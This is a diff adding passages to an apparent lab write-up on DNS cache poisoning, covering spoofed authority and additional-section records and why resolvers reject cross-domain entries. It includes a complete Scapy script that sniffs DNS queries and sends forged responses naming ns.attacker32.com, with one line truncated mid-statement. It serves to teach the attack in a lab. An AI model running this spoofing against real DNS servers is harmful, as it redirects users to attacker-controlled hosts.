@@ -148,3 +148,62 @@ Of course, we have to inlude this in the DNS object as well:
 ```python
 dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=0, an=Anssec, ns=NSsec1/NSsec2)
 ```
+
+However, when we now execute ```dig www.example.com``` and then check the local DNS server's cache we will again only find the entry for the ```example.com``` domain and not for ```google.com```. This is because (properly configured) DNS servers only accept Authority Records that match the domain that was originally requested. This was done to prevent exactly this type of attack, the so called 'Cross-Domain-Poisoning'.
+
+---
+
+## 3.5: Task 5: Spoofing Records in the Additional Section
+
+The full script we used for this attack look like this:
+
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+import sys
+
+NS_NAME = "example.com"
+
+def spoof_dns(pkt):
+        if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
+                print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
+
+                ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Swap the source and destination IPs
+
+                udp = UDP(dport=pkt[UDP].sport, sport=53) # Swap the source and destination ports
+
+                # The Answer Section
+                Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.9.0.1')
+
+                # The Authority Section
+                NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
+                NSsec2 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.example.com')
+
+                #The Additional Section
+                Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
+                Addsec2 = DNSRR(rrname='ns.example.net', type='A', ttl=259200, rdata='5.6.7.8')
+                Addsec3 = DNSRR(rrname='www.facebook.com', type='A', ttl=259200, rdata='3.4.5.6')
+
+                # Create DNS object
+                dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=3, a>
+                spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
+                send(spoofpkt)
+
+myFilter = "udp and dst port 53 and src host 10.9.0.53"
+pkt=sniff(iface='br-4a379a2ae130', filter=myFilter, prn=spoof_dns)
+```
+
+- We still include the answer section
+- The authority section contains two ```NS``` entries for the ```example.com``` domain.
+- The additional section contains three entries: ```ns.attacker.com```, ```ns.example.net``` and ```www.facebook.com```.
+
+After this attack, the local DNS server's cache contains
+
+```
+example.com.            777592  NS      ns.example.com.
+                        777592  NS      ns.attacker32.com.
+```
+
+But none of the entries of the Additional Section are included. Apparently only the two entries of the Authority Section were cached by the local DNS server. We had expected that at least the entry for ```ns.attacker32.com``` would be cached, as there is an Authority Entry for it in the same packet. 
+
+The other two entries were expected to be discarded, as the ```www.facebook.com``` domain is not included in the Authority Section at all and the ```ns.example.net``` is on a different top-level domain (```.net```) than the one in the Authority section.
